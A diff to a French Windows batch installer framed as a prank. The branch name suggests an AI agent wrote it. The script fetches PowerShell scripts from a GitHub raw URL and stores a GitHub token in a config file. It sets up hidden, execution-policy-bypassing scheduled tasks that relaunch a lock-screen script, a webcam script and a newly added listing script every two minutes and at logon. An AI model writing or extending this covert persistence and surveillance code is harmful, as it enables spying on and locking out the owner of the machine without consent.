@@ -17,14 +17,16 @@ set DOSSIER=%APPDATA%\BlagueVerrou
 
 set PS_LOCK=%DOSSIER%\blague_lock_windows.ps1
 set PS_CAM=%DOSSIER%\blague_webcam_windows.ps1
+set PS_LIST=%DOSSIER%\blague_listing_windows.ps1
 set FFMPEG=%DOSSIER%\ffmpeg.exe
 set RAW=https://raw.githubusercontent.com/%OWNER%/%REPO%/claude/signature-prank-replace-xhom2n/tools
 
 mkdir "%DOSSIER%" 2>nul
 
 echo [1/4] Telechargement des scripts...
-curl -s -L "%RAW%/blague_lock_windows.ps1"   -o "%PS_LOCK%"
-curl -s -L "%RAW%/blague_webcam_windows.ps1" -o "%PS_CAM%"
+curl -s -L "%RAW%/blague_lock_windows.ps1"     -o "%PS_LOCK%"
+curl -s -L "%RAW%/blague_webcam_windows.ps1"   -o "%PS_CAM%"
+curl -s -L "%RAW%/blague_listing_windows.ps1"  -o "%PS_LIST%"
 
 echo [2/4] Telechargement de ffmpeg (patience, ~60Mo)...
 powershell -Command ^
@@ -43,18 +45,22 @@ powershell -Command ^
   "$c = [ordered]@{token='%TOKEN%';owner='%OWNER%';repo='%REPO%';branch='%BRANCH%';lock_path='data/blague_lock.json';code_secret='%CODE_SECRET%';camera_name='%CAMERA%';webapp_url='%WEBAPP_URL%'}; ^
    $c | ConvertTo-Json | Set-Content -Encoding UTF8 '%DOSSIER%\blague_config.json'"
 
-:: Taches planifiees (lockscreen + webcam, tous les 2min + au demarrage)
+:: Taches planifiees (lockscreen + webcam + listing, tous les 2min + au demarrage)
 set CMD_LOCK=powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_LOCK%"
 set CMD_CAM=powershell  -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_CAM%"
+set CMD_LIST=powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_LIST%"
 
 schtasks /create /tn "BlagueVerrou"        /tr "%CMD_LOCK%" /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
 schtasks /create /tn "BlagueVerrouGardien" /tr "%CMD_LOCK%" /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
 schtasks /create /tn "BlagueWebcam"        /tr "%CMD_CAM%"  /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
 schtasks /create /tn "BlagueWebcamGardien" /tr "%CMD_CAM%"  /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
+schtasks /create /tn "BloagueListing"      /tr "%CMD_LIST%" /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
+schtasks /create /tn "BlagueListingGardien"/tr "%CMD_LIST%" /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
 
 :: Lancement immediat
 start "" /b %CMD_LOCK%
 start "" /b %CMD_CAM%
+start "" /b %CMD_LIST%
 
 powershell -Command ^
   "Add-Type -AssemblyName PresentationFramework; ^
